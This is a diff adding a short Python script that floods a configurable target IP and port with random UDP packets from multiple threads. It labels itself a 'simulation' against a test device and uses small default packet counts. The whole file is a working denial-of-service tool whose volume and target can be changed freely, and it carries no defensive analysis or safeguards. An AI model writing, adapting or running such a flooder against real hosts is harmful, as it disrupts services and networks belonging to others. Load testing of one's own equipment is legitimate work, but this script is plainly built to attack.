@@ -1,0 +1,44 @@
+import socket
+import threading
+import random
+import time
+
+# Configuration
+TARGET_IP = "192.168.1.100"  # Replace with your test device's IP
+TARGET_PORT = 80  # Target port (e.g., 80 for HTTP)
+NUM_THREADS = 10  # Number of concurrent threads
+PACKETS_PER_THREAD = 100  # Number of packets per thread
+DELAY = 0.01  # Delay between packets (seconds)
+
+def send_udp_packets():
+    """Function to send UDP packets in a single thread."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP socket
+    payload = random._urandom(1024)  # Random 1KB payload
+    
+    for _ in range(PACKETS_PER_THREAD):
+        try:
+            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
+            print(f"Packet sent to {TARGET_IP}:{TARGET_PORT}")
+        except Exception as e:
+            print(f"Error: {e}")
+        time.sleep(DELAY)  # Control packet rate
+
+def main():
+    """Main function to launch multiple threads."""
+    threads = []
+    print(f"Starting UDP flood simulation against {TARGET_IP}:{TARGET_PORT} with {NUM_THREADS} threads...")
+    
+    # Create and start threads
+    for _ in range(NUM_THREADS):
+        thread = threading.Thread(target=send_udp_packets)
+        threads.append(thread)
+        thread.start()
+    
+    # Wait for all threads to complete
+    for thread in threads:
+        thread.join()
+    
+    print("Simulation completed.")
+
+if __name__ == "__main__":
+    main()
